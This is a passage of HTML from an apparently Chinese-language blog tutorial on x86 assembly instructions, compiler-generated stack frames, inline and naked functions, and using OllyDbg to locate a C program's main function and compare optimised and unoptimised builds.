BYTE PTR ES:[EDI]                将AL存储到[EDI]</span><br><span class=\"line\">STOS WORD PTR ES:[EDI]                将AX存储到[EDI]</span><br><span class=\"line\">STOS DWORD PTR ES:[EDI]                将EAX存储到[EDI]</span><br><span class=\"line\">注意这里使用的是ES</span><br><span class=\"line\">当后面为[EDI]时要使用ES</span><br><span class=\"line\">存储完数据后EDI地址的变化方向也受DF标志控制，1减0增</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401019  |.  8D7D C0       lea     edi,[local.16]</span><br><span class=\"line\">0040101C  |.  B9 10000000   mov     ecx,0x10</span><br><span class=\"line\">00401021  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401026  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">现在在看看这几行代码，先把eax的值变为cccccccc，stos将其存储到es中，通过rep循环存储</span><br></pre></td></tr></table></figure>\n<p>REP 指令</p>\n<p>按计数寄存器 (ECX) 中指定的次数重复执行指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV ECX,10</span><br><span class=\"line\">REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]        也可以写成REP MOVSD</span><br><span class=\"line\">代码将会重复执行16次</span><br><span class=\"line\">因为每执行一次EDI和ESI都会变化4，变化方向由DF决定</span><br></pre></td></tr></table></figure>\n<p>LEA 指令</p>\n<p>地址传送指令</p>\n<p>将操作数 B 的有效地址传送到指定的某个寄存器，操作数 A 必须是寄存器</p>\n</blockquote>\n<h3 id=\"跳转和比较指令\"><a class=\"markdownIt-Anchor\" href=\"#跳转和比较指令\">#</a> 跳转和比较指令</h3>\n<h4 id=\"jcc指令\"><a class=\"markdownIt-Anchor\" href=\"#jcc指令\">#</a> JCC 指令</h4>\n<blockquote>\n<p>cc 代表 condition code (状态码)</p>\n<p>Jcc 不是单个指令，它只是描述了跳转之前检查条件代码的跳转助记符</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031210918994.png\" alt=\"image-20221031210918994\" style=\"zoom: 50%;\" />\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3MucHJpbmNldG9uLmVkdS9jb3Vyc2VzL2FyY2hpdmUvZmFsbDEyL2NvczM3NS9JQTMySmNjLnBkZg==\">https://www.cs.princeton.edu/courses/archive/fall12/cos375/IA32Jcc.pdf</span></p>\n<p>JCC 指令用于改变 EIP（CPU 要读取的指令地址）</p>\n</blockquote>\n<h4 id=\"jmp指令\"><a class=\"markdownIt-Anchor\" href=\"#jmp指令\">#</a> JMP 指令</h4>\n<p>JMP 指令：修改 EIP 的值</p>\n<p>JMP 指令只影响了 EIP，不影响堆栈和其它通用寄存器</p>\n<p>JMP 寄存器 / 立即数相当于 MOV EIP, 寄存器 / 立即数</p>\n<h4 id=\"call指令\"><a class=\"markdownIt-Anchor\" href=\"#call指令\">#</a> CALL 指令</h4>\n<p>CALL 指令和 JMP 指令都会修改 EIP 的值</p>\n<p>但 CALL 指令会将返回地址（CALL 指令的下一条指令地址）压入堆栈</p>\n<p>因此也会引起 esp 的变化</p>\n<h4 id=\"ret指令\"><a class=\"markdownIt-Anchor\" href=\"#ret指令\">#</a> RET 指令</h4>\n<p>call 调用跳转后执行完相关代码完要返回到 call 的下一条指令时使用 ret 指令</p>\n<p>ret 指令相当于 pop eip</p>\n<h4 id=\"cmp指令\"><a class=\"markdownIt-Anchor\" href=\"#cmp指令\">#</a> CMP 指令</h4>\n<p>指令格式：CMP R/M,R/M/IMM</p>\n<p>CMP 指令只改变标志寄存器的值</p>\n<p>该指令是比较两个操作数，实际上，它相当于 SUB 指令，但是相减的结果并不保存到第一个操作数中</p>\n<p>只是根据相减的结果来改变 ZF 零标志位的，当两个操作数相等的时候，零标志位置 1</p>\n<h4 id=\"test指令\"><a class=\"markdownIt-Anchor\" href=\"#test指令\">#</a> TEST 指令</h4>\n<p>指令格式：TEST R/M,R/M/IMM</p>\n<p>该指令在一定程度上和 CMP 指令时类似的，两个数值进行与操作，结果不保存，但是会改变相应标志位</p>\n<p>常见用法：用这个指令，可以确定某寄存器是否等于 0</p>\n<p>观察 ZF（零标志位）就可以判断 EAX 是否为 0</p>\n<h3 id=\"if指令编译结果\"><a class=\"markdownIt-Anchor\" href=\"#if指令编译结果\">#</a> if 指令编译结果</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a = 1;</span><br><span class=\"line\">\tif (a == 1) &#123;</span><br><span class=\"line\">\t\tprintf(&quot;%d\\n&quot;,11);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">\t\tprintf(&quot;%d\\n&quot;,22);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0040D440 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">0040D441  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">0040D443  |.  83EC 44       sub     esp,0x44</span><br><span class=\"line\">0040D446  |.  53            push    ebx</span><br><span class=\"line\">0040D447  |.  56            push    esi</span><br><span class=\"line\">0040D448  |.  57            push    edi</span><br><span class=\"line\">0040D449  |.  8D7D BC       lea     edi,[local.17]</span><br><span class=\"line\">0040D44C  |.  B9 11000000   mov     ecx,0x11</span><br><span class=\"line\">0040D451  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">0040D456  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">//上面都是堆栈提升，初始化堆栈，if从这里开始</span><br><span class=\"line\"></span><br><span class=\"line\">// a=1</span><br><span class=\"line\">0040D458  |.  C745 FC 01000&gt;mov     dword ptr ss:[ebp-0x4],0x1</span><br><span class=\"line\">// a==1?a=11:a=22</span><br><span class=\"line\">// 如果a!=1 jmp 0040D476</span><br><span class=\"line\">// 如果a!=1 printf(11) jmp(0040D485)</span><br><span class=\"line\">// jmp(0040D485)就是跳转到if判断结束的地方，继续执行下面的语句</span><br><span class=\"line\">0040D45F  |.  837D FC 01    cmp     dword ptr ss:[ebp-0x4],0x1</span><br><span class=\"line\">0040D463  |.  75 11         jnz     short 0040D476</span><br><span class=\"line\">0040D465  |.  6A 0B         push    0xB                              ; /&lt;%d&gt; = B (11.)</span><br><span class=\"line\">0040D467  |.  68 0C214200   push    0042210C                         ; |format = &quot;%d</span><br><span class=\"line\"></span><br><span class=\"line\">0040D46C  |.  E8 4F020000   call    printf                           ; \\printf</span><br><span class=\"line\">0040D471  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">0040D474  |.  EB 0F         jmp     short 0040D485</span><br><span class=\"line\">0040D476  |&gt;  6A 16         push    0x16                             ; /&lt;%d&gt; = 16 (22.)</span><br><span class=\"line\">0040D478  |.  68 0C214200   push    0042210C                         ; |format = &quot;%d</span><br><span class=\"line\"></span><br><span class=\"line\">0040D47D  |.  E8 3E020000   call    printf                           ; \\printf</span><br><span class=\"line\">0040D482  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">0040D485  |&gt;  33C0          xor     eax,eax</span><br><span class=\"line\">0040D487  |.  5F            pop     edi</span><br><span class=\"line\">0040D488  |.  5E            pop     esi</span><br><span class=\"line\">0040D489  |.  5B            pop     ebx</span><br><span class=\"line\">0040D48A  |.  83C4 44       add     esp,0x44</span><br><span class=\"line\">0040D48D  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">0040D48F  |.  E8 BC3BFFFF   call    _chkesp</span><br><span class=\"line\">0040D494  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">0040D496  |.  5D            pop     ebp</span><br><span class=\"line\">0040D497  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"反汇编分析c语言\"><a class=\"markdownIt-Anchor\" href=\"#反汇编分析c语言\">#</a> 反汇编分析 C 语言</h3>\n<p>有了之前画堆栈图的经验，我们不难看出，尽管我们的函数是个空函数，但其汇编代码依然完成了以下流程：</p>\n<ol>\n<li>提升堆栈</li>\n<li>保护现场</li>\n<li>初始化提升的堆栈</li>\n<li>恢复现场</li>\n<li>返回</li>\n</ol>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">提升堆栈</span><br><span class=\"line\"> 复制代码 隐藏代码</span><br><span class=\"line\"><span class=\"number\">00401010</span>   push        ebp</span><br><span class=\"line\"><span class=\"number\">00401011</span>   mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401013</span>   sub         esp,<span class=\"number\">40</span>h</span><br><span class=\"line\">保护现场</span><br><span class=\"line\"> 复制代码 隐藏代码</span><br><span class=\"line\"><span class=\"number\">00401016</span>   push        ebx</span><br><span class=\"line\"><span class=\"number\">00401017</span>   push        esi</span><br><span class=\"line\"><span class=\"number\">00401018</span>   push        edi</span><br><span class=\"line\">PS：前面的push        ebp也是保护现场</span><br><span class=\"line\"></span><br><span class=\"line\">初始化提升的堆栈</span><br><span class=\"line\"> 复制代码 隐藏代码</span><br><span class=\"line\"><span class=\"number\">00401019</span>   lea         edi,[ebp<span class=\"number\">-40</span>h]</span><br><span class=\"line\"><span class=\"number\">0040101</span>C   mov         ecx,<span class=\"number\">10</span>h</span><br><span class=\"line\"><span class=\"number\">00401021</span>   mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">00401026</span>   rep stos    dword ptr [edi]</span><br><span class=\"line\">恢复现场</span><br><span class=\"line\"> 复制代码 隐藏代码</span><br><span class=\"line\"><span class=\"number\">00401028</span>   pop         edi</span><br><span class=\"line\"><span class=\"number\">00401029</span>   pop         esi</span><br><span class=\"line\"><span class=\"number\">0040102</span>A   pop         ebx</span><br><span class=\"line\"><span class=\"number\">0040102</span>B   mov         esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040102</span>D   pop         ebp</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108201930358.png\" alt=\"image-20221108201930358\"></p>\n<h3 id=\"内联汇编\"><a class=\"markdownIt-Anchor\" href=\"#内联汇编\">#</a> 内联汇编</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tpushad   <span class=\"comment\">//通用寄存器入栈</span></span><br><span class=\"line\">\t\tpushfd   <span class=\"comment\">//标志寄存器入栈</span></span><br><span class=\"line\">\t\tmov al,<span class=\"number\">0xff</span></span><br><span class=\"line\">\t\tadd al,<span class=\"number\">1</span> <span class=\"comment\">//C,P,A,Z = 1</span></span><br><span class=\"line\">\t\tpopad</span><br><span class=\"line\">\t\tpopfd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用 VS2008 创建一个 win32 application</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108192317976.png\" alt=\"image-20221108192317976\"></p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654239398565-0af1e19d-f2a4-4772-b49a-495dcdf19dca.png\" alt=\"img\"></p>\n<p>使用多线程 /mt 之后，用户运行时不需要库既可运行，但文件会变大</p>\n<p>编译一个内联函数</p>\n<p>nake 声明一个裸函数，即堆栈的申请释放都需要我们自己进行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int __declspec (naked) Plus()&#123;</span><br><span class=\"line\">                __asm&#123;</span><br><span class=\"line\">\t\t\t\t\t\tpushad</span><br><span class=\"line\">\t\t\t\t\t\txor     eax,eax</span><br><span class=\"line\">\t\t\t\t\t\tcmp     byte ptr ds:[0x4F040],al</span><br><span class=\"line\">\t\t\t\t\t\tretn</span><br><span class=\"line\">\t\t\t\t\t\tpopad</span><br><span class=\"line\">        &#125;        </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPlus();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Plus () 对应的汇编代码为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00FC2240 &gt; &gt; \\60            pushad</span><br><span class=\"line\">00FC2241   .  33C0          xor     eax,eax</span><br><span class=\"line\">00FC2243      61            popad                       </span><br></pre></td></tr></table></figure>\n<p>正常的函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">int Plus()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint x=1+2;</span><br><span class=\"line\">\treturn 1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPlus();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">003813A0 &gt;  55              push    ebp</span><br><span class=\"line\">003813A1    8BEC            mov     ebp,esp</span><br><span class=\"line\">003813A3    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">003813A9    53              push    ebx</span><br><span class=\"line\">003813AA    56              push    esi</span><br><span class=\"line\">003813AB    57              push    edi</span><br><span class=\"line\">003813AC    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">003813B2    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">003813B7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">003813BC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">003813BE    C745 F8 0300000&gt;mov     dword ptr ss:[ebp-0x8],0x3</span><br><span class=\"line\">003813C5    B8 01000000     mov     eax,0x1</span><br><span class=\"line\">003813CA    5F              pop     edi</span><br><span class=\"line\">003813CB    5E              pop     esi</span><br><span class=\"line\">003813CC    5B              pop     ebx</span><br><span class=\"line\">003813CD    8BE5            mov     esp,ebp</span><br><span class=\"line\">003813CF    5D              pop     ebp</span><br><span class=\"line\">003813D0    C3              retn</span><br></pre></td></tr></table></figure>\n<p>正常的函数系统会自动帮我们进行堆栈的操作我们只需要关系自己的代码即可</p>\n<h3 id=\"寻找c程序入口\"><a class=\"markdownIt-Anchor\" href=\"#寻找c程序入口\">#</a> 寻找 C 程序入口</h3>\n<p>为什么能看到 wmain 的名称</p>\n<p>因为有 pdb 文件，od 读取 pdb 读取 debug 信息</p>\n<p>PDB 全称为程序数据库文件，存储了被编译文件的调试信息，一般用在调式程序中</p>\n<p>1. 找到 wmainCRTStartup</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210348946.png\" alt=\"image-20221108210348946\"></p>\n<p>2. 找到__tmainCRTStartup</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210432400.png\" alt=\"image-20221108210432400\"></p>\n<p>3. 这个 call 002C108C 就是我们的 main 函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">002C260E   .  FF35 70F02D00 push    dword ptr ds:[__wargv]</span><br><span class=\"line\">002C2614   .  FF35 68F02D00 push    dword ptr ds:[__argc]</span><br><span class=\"line\">002C261A   .  E8 6DEAFFFF   call    002C108C</span><br></pre></td></tr></table></figure>\n<p>4.wmain 就是我们的 main 函数</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210639094.png\" alt=\"image-20221108210639094\"></p>\n<blockquote>\n<p>mainCRTStartup 和 wmainCRTStartup 是控制台环境下多字节编码和 Unicode 编码的启动函数</p>\n<p>而 WinMainCRTStartup 和 wWinMainCRTStartup 是 windows 环境下多字节编码和 Unicode 编码的启动函数</p>\n<p>mainCRTStartup 做了哪些事：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210737730.png\" alt=\"image-20221108210737730\"></p>\n<ol>\n<li>前面我们已经知道了 mainCRTStartup 也就是程序入口，那么如何通过 mainCRTStartup 来找到 main 函数入口</li>\n<li>根据函数的参数来进行判断</li>\n<li>main 函数貌似只有两个参数，但实际上 main 函数一共有三个参数，只不过一般第三个参数我们并没有用到，于是在使用 main 函数时并没有加上，完整的 main 函数原型如下:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int main(int argc,char *argv[],char *envp[])&#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>这里的 argv 和 envp 对应 mainCRTStartup 里_setargv () 和_setenvp ()</p>\n<p>main 中参数</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108210850705.png\" alt=\"image-20221108210850705\"></p>\n</blockquote>\n<p>另一种歪门邪道：</p>\n<p>找一个有标示性的断点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221111213357060.png\" alt=\"image-20221111213357060\"></p>\n<p>下断，跳转到断点，F9 执行到断点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221111213436905.png\" alt=\"image-20221111213436905\"></p>\n<p>在堆栈窗口中选中，enter 建进入 main</p>\n<p>或者在有 printf 或者 MessageBox 时可以 F9   CTRL+F9</p>\n<h3 id=\"调试方式\"><a class=\"markdownIt-Anchor\" href=\"#调试方式\">#</a> 调试方式</h3>\n<p>1.OD 直接打开</p>\n<p>2. 附加到已经打开的进程</p>\n<h3 id=\"od常用操作\"><a class=\"markdownIt-Anchor\" href=\"#od常用操作\">#</a> OD 常用操作</h3>\n<p>F9 程序运行到所设断点处</p>\n<p>F2 设置软件断点</p>\n<p>ALT+C 初始页面</p>\n<p>bp  指令地址    设置软件断点</p>\n<p>bc 清除断点</p>\n<p>dd ecx / 内存地址  查看 ecx 寄存器，寄存器中值 以双字显示</p>\n<p>dw 以字显示</p>\n<p>db 以字节显示</p>\n<p>dc 以字符串显示数据</p>\n<p>? 计算表达式</p>\n<p>F8 单步步过</p>\n<p>F7 单步步入</p>\n<p>CTRL + F9  执行到返回</p>\n<p>ALT + F9 执行到用户代码</p>\n<p>CTRL+F2 重新开始</p>\n<p>转到地址 Ctrl +G</p>\n<p>断点窗口 Alt +B</p>\n<p><code>-</code>  到上一步</p>\n<p><code>* </code> 转到当前指令地址</p>\n<p><code>+</code>  转到下一步</p>\n<p>选中汇编，按空格，输入汇编代码</p>\n<h3 id=\"函数调用\"><a class=\"markdownIt-Anchor\" href=\"#函数调用\">#</a> 函数调用</h3>\n<p>注意先关闭 c/c++ 优化</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int add(int a, int b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn a+b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int aaa=1;</span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMessageBox(0,NULL,NULL,MB_OK);</span><br><span class=\"line\">\taaa = add(3,4);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"release\"><a class=\"markdownIt-Anchor\" href=\"#release\">#</a> release</h4>\n<p>优化的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00371000 &gt;/$  6A 00         push    0x0                              ; /Style = MB_OK|MB_APPLMODAL</span><br><span class=\"line\">00371002  |.  6A 00         push    0x0                              ; |Title = NULL</span><br><span class=\"line\">00371004  |.  6A 00         push    0x0                              ; |Text = NULL</span><br><span class=\"line\">00371006  |.  6A 00         push    0x0                              ; |hOwner = NULL</span><br><span class=\"line\">00371008  |.  FF15 A4203700 call    dword ptr ds:[&lt;&amp;USER32.MessageBo&gt;; \\MessageBoxW</span><br><span class=\"line\">0037100E  |.  C705 18303700&gt;mov     dword ptr ds:[aaa],0x7</span><br><span class=\"line\">00371018  |.  33C0          xor     eax,eax</span><br><span class=\"line\">0037101A  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<p>未被优化的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012B1010 &gt;/$  55            push    ebp</span><br><span class=\"line\">012B1011  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">012B1013  |.  6A 00         push    0x0                                            ; /Style = MB_OK|MB_APPLMODAL</span><br><span class=\"line\">012B1015  |.  6A 00         push    0x0                                            ; |Title = NULL</span><br><span class=\"line\">012B1017  |.  6A 00         push    0x0                                            ; |Text = NULL</span><br><span class=\"line\">012B1019  |.  6A 00         push    0x0                                            ; |hOwner = NULL</span><br><span class=\"line\">012B101B  |.  FF15 E4802B01 call    dword ptr ds:[&lt;&amp;USER32.MessageBoxW&gt;]           ; \\MessageBoxW</span><br><span class=\"line\">012B1021  |.  6A 04         push    0x4</span><br><span class=\"line\">012B1023  |.  6A 03         push    0x3</span><br><span class=\"line\">012B1025  |.  E8 D6FFFFFF   call    add</span><br><span class=\"line\">012B102A  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">012B102D  |.  A3 40AC2B01   mov     dword ptr ds:[aaa],eax</span><br><span class=\"line\">012B1032  |.  33C0          xor     eax,eax</span><br><span class=\"line\">012B1034  |.  5D            pop     ebp</span><br><span class=\"line\">012B1035  \\.  C3            